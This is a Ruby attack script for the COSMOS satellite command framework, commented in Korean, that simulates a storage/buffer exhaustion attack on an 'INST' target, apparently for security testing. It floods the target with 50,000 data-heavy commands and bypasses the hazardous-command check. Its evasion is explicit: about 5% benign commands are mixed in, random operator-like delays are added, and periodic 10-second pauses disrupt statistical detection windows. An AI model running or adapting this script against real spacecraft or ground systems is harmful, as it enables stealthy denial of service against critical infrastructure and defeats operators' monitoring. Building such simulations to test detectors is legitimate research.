require 'cosmos/script'

# Author: Adapted for INST Target (Storage/Buffer Exhaustion Simulation)
# Description:
# 이 스크립트는 위성의 데이터 버퍼를 가득 채우는 공격을 시뮬레이션합니다.
# 대량의 데이터 배열(ARYCMD)을 전송하여 위성의 처리 용량을 점유하고, 
# 탐지를 피하기 위해 정상 명령어(CLEAR)를 5% 비율로 섞어 보냅니다.

def pick_benign_command
  # [수정] INST 타겟이 알아들을 수 있는 무해한 명령어(NOOP 대용)
  case rand(2)
    when 0
      ["CLEAR", {}]
    when 1
      ["COLLECT", { "TYPE" => 'NORMAL', "DURATION" => 1.0, "OPCODE" => 0, "TEMP" => 15.0 }]
    end
  end

def storage_exhaustion_attack
  puts "🚀 Launching Stealth Storage/Buffer Exhaustion Attack..."

  # Step 1: 공격 시작 전 초기화 (CLEAR)
  cmd_no_hazardous_check("INST", "CLEAR")

  counter = 0
  total_commands = 50000

  while counter < total_commands
    if rand < 0.95  # 95% 확률로 공격 명령어 발송
      # [수정] FM_COPY 대신 데이터 크기가 큰 ARYCMD를 사용하여 버퍼 점유 시뮬레이션
      # 소스 파일 복사 대신, 큰 데이터 덩어리를 위성으로 계속 밀어넣는 행위입니다.
      cmd_no_hazardous_check("INST", "ARYCMD")
      
      # 추가로 데이터 수집(COLLECT) 명령을 내려 저장 장치(Flash)에 기록을 유도함
      if counter % 10 == 0
        cmd_no_hazardous_check("INST", "COLLECT", "TYPE" => 'NORMAL', "DURATION" => 0.5, "OPCODE" => 99, "TEMP" => 10.0)
      end
      
      counter += 1
    else  # 5% 확률로 무해한 명령어를 섞어 잠행성(Stealth) 유지
      cmd_name, params = pick_benign_command
      cmd_no_hazardous_check("INST", cmd_name, params)
    end

    # 실제 오퍼레이터의 타이핑 속도를 모사하기 위한 짧은 랜덤 지연 (50ms ~ 200ms)
    sleep(rand(0.05..0.2))

    # 탐지 시스템의 슬라이딩 윈도우 통계를 교란하기 위한 10초간의 긴 휴식 (1000회마다)
    if counter > 0 && counter % 1000 == 0
      puts ">> [은폐 모드] 1000회 도달 — 통계 기반 탐지 교란을 위해 10초간 대기"
      sleep(10)
    end
  end

  puts "✅ Stealth Storage Exhaustion Attack Complete: #{counter} aggressive commands sent."
end

# 공격 실행
storage_exhaustion_attack
